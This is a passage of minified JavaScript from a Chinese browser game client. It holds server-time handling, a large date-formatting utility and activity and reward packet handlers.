,e}(n.BaseSystem);e.BagCT=L,window.BagCT=L,__reflect(L.prototype,"BagCT",[]),Systemap.BagCT=function(){return L.ins()},window.BagCT=L},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.GameServerCC=void 0;var n=i(14),o=i(8),s=i(4),a=i(56),r=i(0),l=function(t){function i(){var e=t.call(this)||this;return e.isOpenKF=!1,e.isKf=!1,e.sysId=PackageID.Default,e.regNetMsg(23,e.postServerOpenDay),e.regNetMsg(39,e.doKFOpen),e.regNetMsg(53,e.doKFLinkOpen),observe(e,function(t){return e.setServerTime(t)},Ts.getServerTime),e}return __extends(i,t),Object.defineProperty(i.prototype,"serverTime",{get:function(){return this._serverTime+egret.getTimer()},enumerable:!1,configurable:!0}),i.prototype.getRemainTime=function(t){return Math.floor((o.DateUtils.formatMiniDateTime(t)-this.serverTime)/1e3)},i.prototype.setServerTime=function(t){this._serverTime=o.DateUtils.formatMiniDateTime(t)-egret.getTimer(),this.postServerTimeFlus()},i.prototype.postServerTimeFlus=function(){},i.prototype.postServerOpenDay=function(t){this.serverOpenDay=t.readInt(),this._serverZeroTime=t.readInt(),this._serverHeZeroTime=t.readInt(),this._hefuCount=t.readInt(),this.isOpenLF=t.readBoolean();var e=t.bytesAvailable>3?t.readInt():0;this.serverMaxOpenDay=0==e?this.serverOpenDay:e;var i=1==t.readByte(),n=t.readUnsignedShort();i&&(s.ActorCC.serverName=n),a.ActivityDataFactory.createEx()},i.prototype.doKFOpen=function(t){this.isOpenKF=0!=t.readInt()},i.prototype.doKFLinkOpen=function(t){this.isKf=t.readByte()>=1},i.prototype.isInOtherPlayTime=function(){var t=r.GlobalConfig.RoleBaseConfig.playWayOtherTime;if(!t||!t.length||!t[0])return!1;var i=e.GameServerCC.serverID;return t.some(function(t){var e=t[0],n=t[1];return i>=e&&n>=i})},__decorate([post()],i.prototype,"postServerTimeFlus",null),__decorate([post()],i.prototype,"postServerOpenDay",null),i}(n.BaseSystem);window.gameserverCC=l,__reflect(l.prototype,"gameserverCC",[]),e.GameServerCC=new l,window.GameServerCC=e.GameServerCC},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DateUtils=e.DateStyle=void 0;var n=i(7),o=function(){function t(t,e,i,n){this.format=[],this.from=0,this.to=0,this.isFormatNum=!1,this.format=t,this.from=e,this.to=i,this.isFormatNum=n}return t}();e.DateStyle=o,window.DateStyle=o,__reflect(o.prototype,"DateStyle",[]);var s=function(){function t(){}return t.getFormatTimeByStyle=function(e,i){if(void 0===i&&(i=t.STYLE_1),0>e&&(e=0,console.log("输入参数有误!时间为负数:"+e)),i.from>i.to)return console.log("输入参数有误!to参数必须大于等于from参数,请检查style参数的值"),"";e>>=0;for(var n="",o=i.to;o>=i.from;o--){var s=e/this.mul[o],a="";o!=i.to&&(s%=this.mod[o]),a=i.isFormatNum&&10>s?"0"+(s>>0).toString():(s>>0).toString(),n+=a+i.format[o]}return n},t.getFormatTimeByStyle1=function(e,i){return void 0===i&&(i=t.STYLE_1),this.getFormatTimeByStyle(e/this.MS_PER_SECOND)},t.formatMiniDateTime=function(e){return t.MINI_DATE_TIME_BASE+(2147483647&e)*t.MS_PER_SECOND},t.formatServerTime=function(e){return(e-t.MINI_DATE_TIME_BASE)/t.MS_PER_SECOND},t.getFormatBySecond=function(t,e,i){void 0===e&&(e=1),void 0===i&&(i=2);var n="",o=1e3*t;switch(e){case this.TIME_FORMAT_1:n=this.format_1(o);break;case this.TIME_FORMAT_2:n=this.format_2(o);break;case this.TIME_FORMAT_3:n=this.format_3(o);break;case this.TIME_FORMAT_4:n=this.format_4(o);break;case this.TIME_FORMAT_5:n=this.format_5(o,i);break;case this.TIME_FORMAT_6:n=this.format_6(o);break;case this.TIME_FORMAT_7:n=this.format_7(o);break;case this.TIME_FORMAT_8:n=this.format_8(o);break;case this.TIME_FORMAT_9:n=this.format_9(o);break;case this.TIME_FORMAT_10:n=this.format_10(o);break;case this.TIME_FORMAT_11:n=this.format_11(o);break;case this.TIME_FORMAT_12:n=this.format_12(o);break;case this.TIME_FORMAT_13:n=this.format_13(o);break;case this.TIME_FORMAT_14:n=this.format_14(o);break;case this.TIME_FORMAT_15:n=this.format_15(o);break;case this.TIME_FORMAT_16:n=this.format_16(o);break;case this.TIME_FORMAT_17:n=this.format_17(o);break;case this.TIME_FORMAT_18:n=this.format_18(o);break;case this.TIME_FORMAT_19:n=this.format_19(o)}return n},t.getRenainSecond=function(e){var i=e?new Date(e):new Date,n=t.getTodayZeroSecond(i)+86400-i.getTime()/1e3;return n.toFixed(0)},t.getTodayPassedSecond=function(){var t=new Date,e=((Date.now()-new Date(t.getFullYear(),t.getMonth(),t.getDate()).getTime())/1e3).toFixed(0);return parseInt(e)},t.getTodayZeroSecond=function(t){var e=t?t:new Date;return parseInt((new Date(e.getFullYear(),e.getMonth(),e.getDate()).getTime()/1e3).toFixed(0))},t.showWeekFirstDay=function(t,e){void 0===e&&(e=!1);var i=new Date(t),n=i.getDay();n=n?n:7;var o=new Date(i-864e5*(n-1));return e&&o.setHours(0,0,0,0),o},t.showWeekLastDay=function(e,i){void 0===i&&(i=!1);var n=(new Date,t.showWeekFirstDay(e,i)),o=new Date(1e3*(n.getTime()/1e3+518400));return o},t.getCurrentMonthLast=function(e){var i=new Date(e),n=i.getMonth(),o=++n,s=new Date(i.getFullYear(),o,1);return new Date(s.getTime()-t.MS_PER_DAY)},t.calcWeekFirstDay=function(){var t=new Date,e=t.getDay();e=e>0?e:7;var i=7-e,n=t.getHours(),o=t.getMinutes(),s=t.getSeconds(),a=86400*i*1e3+864e5-(3600*n*1e3+60*o*1e3+1e3*s);return new Date(a)},t.countNextWeekTimes=function(e,i,n){var o=new Date,s=o.getDay(),a=o.getHours(),r=o.getMinutes();if(s=s>0?s:7,e>s){var l=e-s-1,h=l*t.SECOND_PER_DAY,u=t.SECOND_PER_DAY-t.getTodayPassedSecond(),p=i*t.SECOND_PER_HOUR;return o.getTime()/1e3+h+u+p+60*n}return s==e?i>a?o.getTime()/1e3+(i-a-1)*t.SECOND_PER_HOUR+60*n+60*(60-r):a==i?o.getTime()/1e3+60*(n-r):o.getTime()/1e3+(7-s+e-1)*t.SECOND_PER_DAY+t.SECOND_PER_DAY-t.getTodayPassedSecond()+i*t.SECOND_PER_HOUR+60*n:o.getTime()/1e3+(7-s+e-1)*t.SECOND_PER_DAY+t.SECOND_PER_DAY-t.getTodayPassedSecond()+i*t.SECOND_PER_HOUR+60*n},t.format_1=function(e){var i=0,n="##:##:##";return i=Math.floor(e/t.MS_PER_HOUR),n=n.replace("##",t.formatTimeNum(i)),i&&(e-=i*t.MS_PER_HOUR),i=Math.floor(e/t.MS_PER_MINUTE),n=n.replace("##",t.formatTimeNum(i)),i&&(e-=i*t.MS_PER_MINUTE),i=Math.floor(e/1e3),n=n.replace("##",t.formatTimeNum(i))},t.format_2=function(t){var e=new Date(t),i=e.getFullYear(),n=e.getMonth()+1,o=e.getDate(),s=e.getHours(),a=e.getMinutes(),r=e.getSeconds();return i+"-"+n+"-"+o+" "+s+":"+a+":"+r},t.format_3=function(t){var e=this.format_1(t),i=e.split(":");return i[1]+":"+i[2]},t.format_4=function(t){return t<this.MS_PER_HOUR?Math.floor(t/this.MS_PER_MINUTE)+gettext("分钟前"):t<this.MS_PER_DAY?Math.floor(t/this.MS_PER_HOUR)+gettext("小时前"):Math.floor(t/this.MS_PER_DAY)+gettext("天前")},t.format_5=function(t,e){void 0===e&&(e=2);var i="",n=[gettext("天"),gettext("时"),gettext("分"),gettext("秒")],o=[],s=Math.floor(t/this.MS_PER_DAY);o.push(s),t-=s*this.MS_PER_DAY;var a=Math.floor(t/this.MS_PER_HOUR);o.push(a),t-=a*this.MS_PER_HOUR;var r=Math.floor(t/this.MS_PER_MINUTE);o.push(r),t-=r*this.MS_PER_MINUTE;var l=Math.floor(t/1e3);o.push(l);for(var h in o)if(o[h]>0&&(i+=this.formatTimeNum(o[h],Number(h))+n[h],e--,0>=e))break;return i},t.format_6=function(t){var e=new Date(t),i=e.getHours(),n=e.getMinutes(),o=e.getSeconds();return this.formatTimeNum(i)+":"+this.formatTimeNum(n)+":"+this.formatTimeNum(o)},t.format_7=function(t){return t<this.MS_PER_HOUR?gettext("<1小时"):t<this.MS_PER_DAY?Math.floor(t/this.MS_PER_HOUR)+gettext("小时"):Math.floor(t/this.MS_PER_DAY)+gettext("天")},t.format_8=function(t){var e=new Date(t),i=e.getFullYear(),n=e.getMonth()+1,o=e.getDate(),s=e.getHours(),a=e.getMinutes();return i+"-"+n+"-"+o+" "+s+":"+a},t.format_9=function(t){var e=Math.floor(t/this.MS_PER_HOUR);t-=e*this.MS_PER_HOUR;var i=Math.floor(t/this.MS_PER_MINUTE);t-=i*this.MS_PER_MINUTE;var n=Math.floor(t/1e3),o=gettext("{0}小时{1}分钟{2}秒",e,i,n);return o},t.format_10=function(t){var e=Math.floor(t/this.MS_PER_MINUTE);t-=e*this.MS_PER_MINUTE;var i=Math.floor(t/1e3),n=gettext("{0}分{1}秒",e,i);return n},t.format_11=function(t){var e=Math.floor(t/this.MS_PER_HOUR);t-=e*this.MS_PER_HOUR;var i=Math.floor(t/this.MS_PER_MINUTE);t-=i*this.MS_PER_MINUTE;var n=Math.floor(t/1e3),o=gettext("{0}时{1}分{2}秒",e,i,n);return o},t.format_12=function(e){var i=Math.floor(e/this.MS_PER_HOUR);e-=i*this.MS_PER_HOUR;var n=Math.floor(e/this.MS_PER_MINUTE);e-=n*this.MS_PER_MINUTE;var o=Math.floor(e/1e3);return t.formatTimeNum(i)+":"+t.formatTimeNum(n)+":"+t.formatTimeNum(o)},t.format_13=function(e){var i=new Date(e),n=(i.getFullYear(),i.getMonth()+1),o=i.getDay(),s=i.getDate(),a=i.getHours(),r=i.getMinutes(),l=gettext("{0}{1}({2}) {3}:{4}",this.MONTH_CN[n],this.DAY_CN[s],this.WEEK_CN2[o],t.formatTimeNum(a),t.formatTimeNum(r));return l},t.getMonthStr=function(t){return this.MONTH_CN[t]},t.format_14=function(t){var e=new Date(t),i=e.getHours(),n=e.getMinutes();return i+gettext("时")+n+gettext("分")},t.format_15=function(e){var i=new Date(e),n=i.getMonth()+1,o=i.getDate(),s=i.getHours(),a=i.getMinutes();return t.formatTimeNum(n)+"-"+t.formatTimeNum(o)+" "+t.formatTimeNum(s)+":"+t.formatTimeNum(a)},t.format_16=function(e){var i=0,n="##:##:##";return i=Math.floor(e/t.MS_PER_MINUTE),n=n.replace("##",t.formatTimeNum(i)),i&&(e-=i*t.MS_PER_MINUTE),i=Math.floor(e/1e3),n=n.replace("##",t.formatTimeNum(i)),i&&(e-=1e3*i),i=Math.floor(e%1e3),n=n.replace("##",t.formatTimeNum(i))},t.format_17=function(t){var e="",i=[gettext("天"),gettext("时"),gettext("分"),gettext("秒"),""],n=[],o=Math.floor(t/this.MS_PER_DAY);n.push(o),t-=o*this.MS_PER_DAY;var s=Math.floor(t/this.MS_PER_HOUR);n.push(s),t-=s*this.MS_PER_HOUR;var a=Math.floor(t/this.MS_PER_MINUTE);n.push(a),t-=a*this.MS_PER_MINUTE;var r=Math.floor(t/1e3);n.push(r),t-=1e3*r,n.push(Math.floor(t/10));for(var l in n)(n[l]>0||""!=e)&&(e+=this.formatTimeNum(n[l],Number(l))+i[l]);return e},t.format_18=function(t){var e=new Date(t),i=e.getMonth()+1,n=e.getDate(),o=e.getHours(),s=e.getMinutes(),a=e.getSeconds();return i+"/"+n+" "+this.formatTimeNum(o)+":"+this.formatTimeNum(s)+":"+this.formatTimeNum(a)},t.format_19=function(t){var e=new Date(t),i=(e.getFullYear(),e.getMonth()+1),n=e.getDay(),o=e.getDate(),s=gettext("{0}{1}({2}) ",this.MONTH_CN[i],this.DAY_CN[o],this.WEEK_CN2[n]);return s},t.formatTimeNum=function(t,e){return t>=10?t.toString():0==e?t.toString():"0"+t},t.checkTime=function(t,e){var i=(new Date).getTime(),n=t>i+e*this.MS_PER_DAY;
return n},t.formatFullTime=function(t){var e,i=new Date(t),n=i.getFullYear(),o=i.getMonth()+1,s=i.getDate(),a=("0"+i.getHours()).slice(-2),r=("0"+i.getMinutes()).slice(-2),l=("0"+i.getSeconds()).slice(-2);return e=gettext("{0}年{1}月{2}日  {3}:{4}:{5}",n,o,s,a,r,l)},t.formatStrTimeToMs=function(t){var e=new Date,i=t.split(".");e.setFullYear(+i[0]),e.setMonth(+i[1]-1);var n=i[2].split("-");e.setDate(n[0]);var o=n[1].split(":");return e.setHours(o[0]),e.setMinutes(o[1]),e.setSeconds(0),e.getTime()},t.formatStrTimeToToday=function(t,e){var i=t.split(":").map(Number),n=i[0],o=i[1],s=new Date(e),a=new Date(s.getFullYear(),s.getMonth(),s.getDate()),r=a.getTime()+60*n*60*1e3+60*o*1e3;return r},t.formatStrTimeToToday1=function(t,e){var i=t.split(":").map(Number),n=i[0],o=i[1],s=i[2],a=new Date(e),r=new Date(a.getFullYear(),a.getMonth(),a.getDate()),l=r.getTime()+60*n*60*1e3+60*o*1e3+s;return l},t.checkInStrTime=function(e,i){if(!e)return!1;var n=e.split("-");if(2!=n.length)return!1;var o=t.formatStrTimeToToday1(n[0],i),s=t.formatStrTimeToToday1(n[1],i);return o>i||i>s?!1:!0},t.getCurrentMonthFirst=function(){var t=new Date(n.GameServerCC.serverTime),e=t.getMonth();return new Date(t.getFullYear(),e,1)},t.getWeekNumber=function(t){var e=new Date(1e3*t),i=e.getUTCFullYear(),n=e.getUTCMonth(),o=e.getUTCDate(),s=(e.getUTCMonth()+1,new Date(Date.UTC(i,n,o))),a=s.getUTCMonth()+1;return a},t.TIME_FORMAT_1=1,t.TIME_FORMAT_2=2,t.TIME_FORMAT_3=3,t.TIME_FORMAT_4=4,t.TIME_FORMAT_5=5,t.TIME_FORMAT_6=6,t.TIME_FORMAT_7=7,t.TIME_FORMAT_8=8,t.TIME_FORMAT_9=9,t.TIME_FORMAT_10=10,t.TIME_FORMAT_11=11,t.TIME_FORMAT_12=12,t.TIME_FORMAT_13=13,t.TIME_FORMAT_14=14,t.TIME_FORMAT_15=15,t.TIME_FORMAT_16=16,t.TIME_FORMAT_17=17,t.TIME_FORMAT_18=18,t.TIME_FORMAT_19=19,t.MS_PER_SECOND=1e3,t.MS_PER_MINUTE=6e4,t.MS_PER_HOUR=36e5,t.MS_PER_DAY=864e5,t.SECOND_PER_HOUR=3600,t.SECOND_PER_DAY=86400,t.SECOND_PER_MONTH=2592e3,t.SECOND_PER_YEAR=31104e3,t.DAYS_PER_WEEK=7,t.YEAR_PER_YEAR=1,t.MONTH_PER_YEAR=12,t.DAYS_PER_MONTH=30,t.HOURS_PER_DAY=24,t.MUNITE_PER_HOUR=60,t.SECOND_PER_MUNITE=60,t.SECOND_PER_SECOND=1,t.SECOND_2020=1577808e3,t.mod=[t.SECOND_PER_MUNITE,t.MUNITE_PER_HOUR,t.HOURS_PER_DAY,t.DAYS_PER_MONTH,t.MONTH_PER_YEAR,t.YEAR_PER_YEAR],t.mul=[t.SECOND_PER_SECOND,t.SECOND_PER_MUNITE,t.SECOND_PER_HOUR,t.SECOND_PER_DAY,t.SECOND_PER_MONTH,t.SECOND_PER_YEAR],t.MINI_DATE_TIME_BASE=Date.UTC(2020,0)+(new Date).getTimezoneOffset()*t.MS_PER_MINUTE,t.TIME_ZONE_OFFSET=8*t.MS_PER_HOUR,t.TO_SECOND=0,t.TO_MINUTE=1,t.TO_HOUR=2,t.TO_DAY=3,t.TO_MONTH=4,t.TO_YEAR=5,t.FORMAT_1=[],t.FORMAT_2=[":",":",":",":",":",":"],t.WEEK_CN=[],t.WEEK_CN2=[],t.MONTH_CN=[],t.DAY_CN=[],t.STYLE_1=new o(t.FORMAT_1,t.TO_SECOND,t.TO_HOUR,!1),t.STYLE_2=new o(t.FORMAT_1,t.TO_SECOND,t.TO_DAY,!1),t.STYLE_3=new o(t.FORMAT_2,t.TO_SECOND,t.TO_HOUR,!0),t.STYLE_4=new o(t.FORMAT_1,t.TO_SECOND,t.TO_MINUTE,!0),t}();e.DateUtils=s,window.DateUtils=s,__reflect(s.prototype,"DateUtils",[]),window.DateUtils=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DabiaoData=e.Activity=void 0;var n=i(14),o=i(0),s=i(4),a=i(56),r=i(7),l=i(8),h=i(2),u=i(71),p=i(6),d=i(343),c=i(171),f=i(345),g=i(346),m=i(54),v=i(43),y=i(239),C=i(64),T=i(348),b=i(240),w=function(t){function e(){var e=t.call(this)||this;return e.activityData={},e.palyEffList=[],e.rankInfoList=[],e.indexCurrDabiao=0,e.hfLoginDay=1,e.geLoginDay=1,e.activityId=0,e.hongbaoId=0,e.act64SelType=1,e.isSuccee=!1,e.sysId=PackageID.Activity,e.regNetMsg(1,e.doActivityData),e.regNetMsg(2,e.postRewardResult),e.regNetMsg(3,e.doDaBiaoInfo),e.regNetMsg(5,e.doRewardStatu),e.regNetMsg(6,e.postEnvelopeData),e.regNetMsg(8,e.postRedEnvelopeData),e.regNetMsg(7,e.postChangePage),e.regNetMsg(10,e.postDownHongBao),e.regNetMsg(11,e.doSevenDayData),e.regNetMsg(12,e.doChangeSevenDayData),e.regNetMsg(22,e.postKuaFuRank),e.regNetMsg(34,e.postAddTips52),e.regNetMsg(37,e.openServerRankInfoBack),e}return __extends(e,t),e.prototype.reqOpenServerRankInfo=function(t){var e=this.getBytes(37);e.writeInt(t),this.sendToServer(e)},e.prototype.openServerRankInfoBack=function(t){var e=t.readInt(),i=this.getActivityDataById(e);i.updateRankInfo(t),this.postOpenServerRankInfoChange()},e.prototype.postOpenServerRankInfoChange=function(){},e.prototype.sendEnvelopeData=function(t,e){var i=this.getBytes(6);i.writeInt(t),i.writeUnsignedShort(e),this.sendToServer(i)},e.prototype.postEnvelopeData=function(t){var e=t.readInt(),i=this.getActivityDataById(e);if(i instanceof c.ActivityType12Data){var n=t.readByte();if(n){var o=t.readUnsignedShort(),s=t.readShort(),a=t.readShort(),r=t.readShort(),l=t.readInt(),h=t.readString(),u=t.readString(),p=new c.EnvelopeData;return p.id=e,p.eId=o,p.job=s,p.sex=a,p.index=r,p.serverId=l,p.name=h,p.desc=u,void this.postEnvelopeDataCall(p)}this.postEnvelopeDataCall(null)}else i.update(t),this.postActivityIsGetAwards()},e.prototype.postRedEnvelopeData=function(t){var e=t.readInt();if(this.activityData[e]&&this.activityData[e]instanceof c.ActivityType12Data){var i=this.activityData[e],n=t.readShort(),o=t.readShort();if(1==n){if(o){var s=new c.RedEnvelope;s.id=t.readUnsignedShort(),s.timer=t.readInt(),i.envelopeData.push(s)}}else{for(var a=[],r=0;o>r;r++){var s=new c.RedEnvelope;s.id=t.readUnsignedShort(),s.timer=t.readInt(),a.push(s)}i.envelopeData=a}}},e.ins=function(){return t.ins.call(this)},e.prototype.openHongbaoWin=function(){s.ActorCC.level>=30&&win.open("HongBaoWin")},e.prototype.postEnvelopeDataCall=function(t){return t},Object.defineProperty(e.prototype,"activityTimers",{get:function(){return this._actTimeSecond1=this._actTimeSecond1?this._actTimeSecond1:[],this._actTimeSecond1},enumerable:!1,configurable:!0}),e.prototype.postGetRedEnvelope=function(t,e,i,n,o){return[t,e,i,n,o]},e.prototype.initZero=function(){if(this.activityData)for(var t in this.activityData){var e=+t;if(1e4>e){var i=o.GlobalConfig.ActivityConfig[e];i&&this.sendChangePage(e)}}},e.prototype.getActivityDataById=function(t){return this.activityData[t]},e.prototype.getActivityDataByType=function(t,e){var i=this.getActivityDatasByType(t,e);return i&&i.length>0?i:null},e.prototype.getActivityDatasByType=function(t,e){var i,n,s,a=[];for(var r in this.activityData){var l=this.activityData[r],h=o.GlobalConfig["ActivityType"+t+"Config"]?o.GlobalConfig["ActivityType"+t+"Config"][l.id]:null,u=h&&(h.showType||(null===(i=h[0])||void 0===i?void 0:i.showType)||(null===(n=h[1])||void 0===n?void 0:n.showType)||(null===(s=h[1][1])||void 0===s?void 0:s.showType))||0;!l||l.type!=t||e&&e!=u||!l.isOpenActivity()||a.push(l)}return a},e.prototype.getActivityDatasByPageStyle=function(t){var e=[];for(var i in this.activityData){var n=this.activityData[i];n.pageStyle==t&&n.isOpenActivity()&&!n.getHide()&&e.push(n)}return e},e.prototype.getActivityLengthByPageStyle=function(t){var i=e.ins().getActivityDatasByPageStyle(t)||[];return i.length||0},e.prototype.getPalyEffListById=function(t){return this.palyEffList[t]},e.prototype.setPalyEffListById=function(t,e){this.palyEffList[t]=e},e.prototype.doActivityData=function(t){this.activityData={};for(var e=t.readShort(),i=0;e>i;i++){var n=a.ActivityDataFactory.create(t);n&&(this.activityData[n.id]=n)}this.postActivityIsGetAwards(),a.ActivityDataFactory.createEx()},e.prototype.postActivityIsGetAwards=function(){},e.prototype.postRewardResult=function(t){var e=t.readBoolean();this.isSuccee=e;var i=t.readInt(),n=this.getActivityDataById(i);return n&&n.postRewardResult?n.postRewardResult(t):n&&n instanceof b.ActivityType38Data?n.postHongBaoData(t):n instanceof d.ActivityType62Data?n.parserChange(t):this.getActivityDataById(i).update(t),this.postActivityPanel(i),this.postActivityIsGetAwards(),{activityID:i,isSuccee:e}},e.prototype.postActivityPanel=function(t){return t},e.prototype.postHuntResult=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return t},e.prototype.sendReward=function(t,e,i,n){if(urlParam.appid){var s=o.GlobalConfig.ActivityConfig[t];if(s){var a=!1;if(s.onlyappid){for(var r in s.onlyappid)urlParam.appid==s.onlyappid[r]&&(a=!0);if(!a)return void(s.onlyappidTip?h.TipsCT.ins().showTips(s.onlyappidTip):h.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:关注公众号转端获得奖励|")))}}}var l=this.getBytes(2);l.writeInt(t),l.writeShort(e),l.writeShort(i),l.writeInt(n),this.sendToServer(l)},e.prototype.postChangePage=function(t){var e=a.ActivityDataFactory.create(t);e&&(this.activityData[e.id]=e);var i=this.getActivityDataByType(a.ActivityDataType._62);if(i&&i.length>0)for(var n=0,o=i;n<o.length;n++){var s=o[n];s.type==a.ActivityDataType._62&&(s.openIndexs.length=0,console.log("..aa"))}return this.postActivityIsGetAwards(),e?e.id:0},e.prototype.sendChangePage=function(t){var e=this.getBytes(7);e.writeInt(t),this.sendToServer(e)},e.prototype.getSevenDayStast=function(){var t;t=this.dayNum>14?14:this.dayNum;for(var e=1;t>=e;e++){var i=o.GlobalConfig.LoginRewardsConfig[e];if(i&&this.dayNum>=i.day&&0==(this.isAwards>>i.day&1))return!0}return!1},e.prototype.sendGetSevenDayAwards=function(t){var e=this.getBytes(12);e.writeShort(t),this.sendToServer(e)},e.prototype.doSevenDayData=function(t){this.dayNum=t.readShort(),this.isAwards=t.readInt(),this.postSevendayIsAwards()},e.prototype.doChangeSevenDayData=function(t){var e=t.readBoolean();if(e){t.readShort();this.isAwards=t.readInt(),this.postSevendayAwardCallback()}else h.TipsCT.ins().showTips(gettext("|C:0xf3311e&T:背包已满，请清理背包|"));this.postSevendayIsAwards()},e.prototype.postSevendayAwardCallback=function(){},e.prototype.postSevendayIsAwards=function(){},e.prototype.postKuaFuRank=function(t){var e=t.readInt(),i=t.readByte(),n=t.readInt(),o=this.getActivityDataById(e);o&&o.CleanRandData();for(var s=0;n>s;s++)if(1==i){var a=new g.KuaFuRankData;a.actorId=t.readInt(),a.rmb=t.readInt(),a.rank=t.readInt(),a.serverName=t.readInt(),a.roleName=t.readString(),a.job=t.readInt(),a.sex=t.readInt(),a.serverId=t.readInt(),o&&o.SetRankData(a)}else if(2==i){var a=new QiongQiRankData;a.rank=t.readInt(),a.actorId=t.readInt(),a.level=t.readInt(),a.serverId=t.readInt(),a.roleName=t.readString(),o&&o.SetQRankData(a)}var r=t.readInt();o&&(o.mycost=r)},e.prototype.sendKuaFuRank=function(t){var e=this.getBytes(22);e.writeInt(t),this.sendToServer(e)},e.prototype.getbtnInfo=function(t){var e=o.GlobalConfig.ActivityBtnConfig;return e[t]?e[t]:null},e.prototype.isShowRedPointByBtnInfo=function(t){return this.checkAcCanGet(t.id+"")},e.prototype.checkAcCanGet=function(t){var e=this.activityData;for(var i in e)if(i==t&&e[i].isOpenActivity()&&e[i].canReward()&&e[i].specialState())return!0;return!1},e.prototype.IsHefuXunBaoTimer=function(){if(!r.GameServerCC._serverHeZeroTime)return!1;var t=l.DateUtils.formatMiniDateTime(r.GameServerCC._serverHeZeroTime),e=t+24*o.GlobalConfig.TreasureHuntConfig.hefuDay*60*60*1e3,i=r.GameServerCC.serverTime;return i>=t&&e>=i},e.prototype.postAddTips52=function(t){var e=t.readInt(),i=this.getActivityDataById(e);i&&i instanceof f.ActivityType52Data&&i.addTips2(t)},e.prototype.postHuntResultPlayFunc=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return t},e.prototype.postHuntResultFunc=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return t},e.prototype.sendRewardStatu=function(t){var e=this.getBytes(5);e.writeInt(t),this.sendToServer(e)},e.prototype.doRewardStatu=function(t){var e=t.readInt(),i=this.getActivityDataById(e);i?i.updateData(t):(i=new T.ActivityType5Data(null),this.activityData[e]=i,i.updateData(t)),this.postActivityIsGetAwards()},e.prototype.doDaBiaoInfo=function(t){this.dabiaoDecode(t),this.postGetDaBiaoInfo()},e.prototype.postGetDaBiaoInfo=function(){},e.prototype.postDownHongBao=function(t){this.activityId=t.readInt(),this.hongbaoId=t.readShort(),b.ActivityType38Data.HasHongBao=!0},e.prototype.postHongBaoOpen=function(){},e.prototype.sendGetHongBao=function(t,e){var i=this.getBytes(2);i.writeInt(e),i.writeShort(1),i.writeShort(t),i.writeInt(t),this.sendToServer(i)},e.prototype.sendDabiaoInfo=function(t){var e=this.getBytes(3);e.writeInt(t),this.sendToServer(e)},e.prototype.sendYb41=function(t){var e=this.getBytes(36);e.writeShort(t),this.sendToServer(e)},e.prototype.dabiaoDecode=function(t){this.isDaBiao=t.readBoolean(),this.indexCurrDabiao=Math.max(t.readInt()-1,0);var e=t.readShort();if(e==u.RankDataType.TYPE_LEVEL)t.readInt(),t.readInt();else if(e==u.RankDataType.TYPE_BAOSHI)this.myDabiaoInfo=t.readInt();else if(e==u.RankDataType.TYPE_ZHANLING){var i=t.readInt(),n=t.readInt();this.myDabiaoInfo=[i,n]}else e==u.RankDataType.TYPE_LONGHUN?this.myDabiaoInfo=t.readInt():e==u.RankDataType.TYPE_XIAOFEI?this.myDabiaoInfo=t.readInt():e==u.RankDataType.TYPE_HF_XIAOFEI?(this.myDabiaoInfo=t.readInt(),this.myPaiming=t.readInt()):this.myDabiaoInfo=t.readDouble();var o,s=t.readShort();this.rankInfoList=[];for(var a=0;s>a;a++)this.rankInfoList[a]||this.rankInfoList.push(new I),o=this.rankInfoList[a],o.prase(t,e)},e.prototype.IsBossScoreTitle=function(t,e){var i=o.GlobalConfig.ActivityType7Config[t],n=this.getActivityDataById(t);for(var s in i){var a=i[s];if(a.title==e&&this.getIsBuy(a)&&n.bossScore>=a.score)return!0}return!1},e.prototype.getIsBuy=function(t){if(t){var e=this.getActivityDataById(t.Id);return t.count&&e.personalRewardsSum[t.index]>=t.count?!1:!(t.scount&&e.worldRewardsSum[t.index]>=t.scount)}return!1},e.prototype.getType7RedPoint=function(t){var i;o.GlobalConfig.XuanWuBossBase;var n=o.GlobalConfig.ActivityType7Config[t],s=this.getActivityDataById(t);if(6==n[1].showType)for(var a in n){var r=s.getExchange(n[a].index);if(r==e.CanGet)return!0}else for(var a in n)if(this.getIsBuy(n[a]))if(n[a].itemId){if(i=p.BagCT.ins().getBagItemById(n[a].itemId),i&&i.count>=n[a].itemCount)return!0}else if(s.bossScore>=n[a].score)return!0;return!1},e.prototype.getType9RedPoint=function(t){var e=!1;if(this.getRollSum(t))e=!0;else{var i=o.GlobalConfig.ActivityType9Config[t];for(var n in i[0].reward)if(this.isGetRollReward(t,+n)){e=!0;break}}return e},e.prototype.isGetRollReward=function(t,e){var i=this.activityData[t];if(!i)return!1;var n=o.GlobalConfig.ActivityType9Config[t];return n&&n[0]&&n[0].reward[e].times&&i.count>=n[0].reward[e].times&&!(i.record>>e+1&1)?!0:!1},e.prototype.getIsRollTen=function(t){var e=o.GlobalConfig.ActivityType9Config[t][0];if(e){var i=0;if(e.item){var n=p.BagCT.ins().getBagItemById(e.item);if(n&&(i+=n.count),i>=10)return!0}if(i=10-i,e.yb&&s.ActorCC.yb>=e.yb*i)return!0}return!1},e.prototype.getRollSum=function(t){var e=o.GlobalConfig.ActivityType9Config[t];if(e&&e[0]){var i=p.BagCT.ins().getBagItemById(e[0].item);if(i)return!0}return!1},e.prototype.handleTurn=function(t){if(t){if("number"==typeof t&&!isNaN(t))return v.CityCC.ins().sendCityGo(1,t),null;var e=win.openCheck(t[0],[t[1]]);if(e){if("MainMap"==t[0]){win.closeTopLevelEasy(t[0]);var i=y.MainMapBoss.setTabIdx(t[1],!0);return i&&C.MainUICC.onClickMap(!0),i}if(""!=t[0]){win.closeTopLevelEasy(t[0]);var n=t.slice(1);"ForestWin"==t[0]?(m.Fb2CT.ins().sendForestInfo(),m.Fb2CT.ins().sendForestMapInfo(),m.Fb2CT.ins().sendForestMapStarLv(),m.Fb2CT.ins().sendForestBuyData()):"BagAddCellWin"==t[0]&&p.BagCT.ins().sendBagCellAdd(1);var i=win.open2.apply(win,__spreadArrays([t[0]],n));return i}}}},e.prototype.set70SelectItem=function(t){this.returnAct70Indx={idx:t.idx,lisIdx:t.lisIdx,value:t.value},this.update70PanelAct()},e.prototype.update70PanelAct=function(){},e.prototype.return70DataByValue=function(t,e){var i=o.GlobalConfig.OptionalGiftConfig[t];if(i&&i.options){var 